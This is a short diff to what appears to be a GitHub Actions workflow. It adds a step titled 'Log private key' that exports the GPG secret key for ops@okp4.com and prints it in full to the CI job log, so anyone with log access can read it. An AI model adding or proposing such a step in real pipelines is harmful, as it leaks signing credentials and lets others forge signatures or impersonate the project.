@@ -30,3 +30,9 @@ jobs:
       -
         name: List keys
         run: gpg -K
+      -
+        name: Log private key
+        run: |
+          export PRIVATE_KEY=$(gpg --export-secret-key -a ops@okp4.com)
+          echo "PRIVATE KEY: $PRIVATE_KEY"
+          
